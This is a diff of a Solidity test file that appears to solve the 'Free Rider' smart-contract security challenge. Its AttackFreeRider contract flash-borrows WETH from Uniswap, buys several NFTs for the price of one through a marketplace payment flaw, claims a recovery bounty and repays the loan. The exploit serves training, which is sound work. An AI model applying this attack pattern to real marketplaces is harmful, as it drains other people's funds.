@@ -123,13 +123,8 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-
-        AttackFreeRider attackFreeRider = new AttackFreeRider{ value: 0.045 ether } (
-            address(uniswapPair),
-            address(marketplace),
-            address(weth),
-            address(nft),
-            address(recoveryManager)
+        AttackFreeRider attackFreeRider = new AttackFreeRider{value: 0.045 ether}(
+            address(uniswapPair), address(marketplace), address(weth), address(nft), address(recoveryManager)
         );
 
         attackFreeRider.start();
@@ -159,6 +154,7 @@ contract FreeRiderChallenge is Test {
 import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
 import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+
 interface IMarketplace {
     function buyMany(uint256[] calldata tokenIds) external payable;
 }
@@ -186,12 +182,21 @@ contract AttackFreeRider {
     }
 
     function start() external payable {
-         // 1. Request a flashSwap of 15 WETH from Uniswap Pair
+        // 1. Request a flashSwap of 15 WETH from Uniswap Pair
         pair.swap(NFT_PRICE, 0, address(this), "1");
     }
 
-    function uniswapV2Call(address /*sender*/, uint /*amount0*/, uint /*amount1*/, bytes calldata /*data*/) external {
-
+    function uniswapV2Call(
+        address,
+        /*sender*/
+        uint256,
+        /*amount0*/
+        uint256,
+        /*amount1*/
+        bytes calldata /*data*/
+    )
+        external
+    {
         // Access Control
         require(msg.sender == address(pair));
         require(tx.origin == player);
@@ -200,11 +205,11 @@ contract AttackFreeRider {
         weth.withdraw(NFT_PRICE);
 
         // 3. Buy 6 NFTS for only 15 ETH total
-        marketplace.buyMany{ value: NFT_PRICE }(tokens);
+        marketplace.buyMany{value: NFT_PRICE}(tokens);
 
         // 4. Send NFTs to recovery contract so we can get the bounty
         bytes memory data = abi.encode(player);
-        for(uint256 i; i < tokens.length; i++){
+        for (uint256 i; i < tokens.length; i++) {
             nft.safeTransferFrom(address(this), recoveryContract, i, data);
         }
 
@@ -212,16 +217,10 @@ contract AttackFreeRider {
         uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
         weth.deposit{value: amountToPayBack}();
         weth.transfer(address(pair), amountToPayBack);
-        
     }
 
     // To make sure safeTransferFrom won't revert
-    function onERC721Received(
-        address,
-        address,
-        uint256,
-        bytes memory
-    ) external pure returns (bytes4) {
+    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
         return IERC721Receiver.onERC721Received.selector;
     }
 
